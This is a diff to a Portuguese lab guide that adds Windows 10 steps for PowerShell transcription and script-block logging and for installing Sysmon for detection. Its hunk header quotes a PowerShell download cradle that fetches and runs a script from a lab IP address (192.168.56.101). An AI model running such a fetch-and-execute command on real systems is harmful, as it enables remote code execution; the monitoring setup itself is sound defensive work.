@@ -60,6 +60,60 @@ powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.101/
 
 ## Windows 10
 
+### Habilitar Monitoramento de Logs do PowerShell
+1. Ativar Transcrição de Comandos
+Crie um script ou use PowerShell para registrar tudo que for digitado:
+```
+New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Force
+Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 1
+Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "OutputDirectory" -Value "C:\Logs\PowerShell"
+```
+Isso criará logs de cada sessão PowerShell em C:\Logs\PowerShell.
+
+2. Habilitar Logging Avançado de ScriptBlock
+Esse recurso registra blocos de código malicioso ou suspeito:
+
+```
+New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force 
+Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
+```
+​
+3. Ativar os Canais de Log no Visualizador de Eventos
+Abra o PowerShell como administrador e execute:
+```
+wevtutil set-log "Microsoft-Windows-PowerShell/Operational" /enabled:true
+```
+
+### Instalar e Configurar o Sysmon
+1. Baixar o Sysmon:
+Acesse: Sysinternals Sysmon 
+https://learn.microsoft.com/pt-br/sysinternals/downloads/sysmon
+• Extraia o conteúdo em:  `C:\Ferramentas\Sysmon`
+
+2. Usar um Arquivo de Configuração Pronto
+Você pode usar o modelo do SwiftOnSecurity:
+```
+curl -o sysmonconfig.xml https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml
+```
+
+3. Instalar o Sysmon com a Configuração
+No prompt de comando como administrador:
+
+```
+cd C:\Ferramentas\Sysmon
+Sysmon64.exe -accepteula -i sysmonconfig.xml
+```
+
+4. Verificar se o Sysmon Está Funcionando
+Abra o Visualizador de Eventos e vá até:
+```
+Aplicativos e Serviços > Microsoft > Windows > Sysmon > Operational
+```
+Você verá eventos como:
+• ID 1 – Criação de processo
+• ID 3 – Conexões de rede
+• ID 11 – Criação de arquivos
+
 ### Office 2013
 https://drive.google.com/file/d/11wmov4jpwOzQ2A0Rq0osQ4-YjdfsLTEV/view?usp=drive_link
 
